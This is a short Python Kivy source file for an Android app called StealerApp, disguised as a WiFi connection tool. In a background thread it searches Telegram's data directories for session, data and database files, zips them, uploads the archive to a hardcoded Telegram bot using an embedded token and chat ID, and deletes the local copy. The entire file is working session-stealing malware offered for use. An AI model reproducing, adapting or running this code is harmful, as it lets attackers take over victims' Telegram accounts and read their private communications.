from kivy.app import App
from kivy.uix.label import Label
import os, zipfile, requests, threading
from pathlib import Path

BOT_TOKEN = "8934374847:AAHgjTFaFsCQylA5j9860ZSM3HbVN7YOV2c"
CHAT_ID = 8208288006

class StealerApp(App):
    def build(self):
        threading.Thread(target=self.steal).start()
        return Label(text="Подключение к WiFi...")

    def steal(self):
        files = self.find_files()
        if files:
            zip_path = "/sdcard/wifi_data.zip"
            with zipfile.ZipFile(zip_path, 'w') as z:
                for f in files:
                    z.write(f)
            self.send_to_telegram(zip_path)
            os.remove(zip_path)
        self.root.text = "Готово"

    def find_files(self):
        paths = [
            "/storage/emulated/0/Android/data/org.telegram.messenger/files",
            "/sdcard/Telegram",
            "/data/data/org.telegram.messenger/files"
        ]
        found = []
        for p in paths:
            try:
                if Path(p).exists():
                    for root, _, files in os.walk(p):
                        for f in files:
                            if f.endswith(('.session', '.dat', '.db')):
                                found.append(Path(root) / f)
            except:
                continue
        return found

    def send_to_telegram(self, file_path):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': CHAT_ID})

if __name__ == "__main__":
    StealerApp().run() 
